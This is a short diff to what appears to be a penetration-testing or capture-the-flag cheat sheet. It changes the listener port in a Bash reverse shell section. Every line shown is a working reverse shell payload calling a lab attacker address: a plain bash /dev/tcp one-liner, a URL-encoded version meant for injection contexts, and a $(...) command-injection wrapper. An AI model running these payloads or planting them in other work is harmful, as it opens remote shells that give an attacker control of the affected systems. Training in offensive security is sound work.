@@ -79,10 +79,10 @@ Use [revshells.com](https://www.revshells.com/) to generate — set IP, port, sh
 ### Bash
 
 ```bash
-bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.x/9001 0>&1
 
 # URL-encoded (for injection contexts)
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F4444%200%3E%261%22
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F9001%200%3E%261%22
 
 # From command injection
 $(bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1')
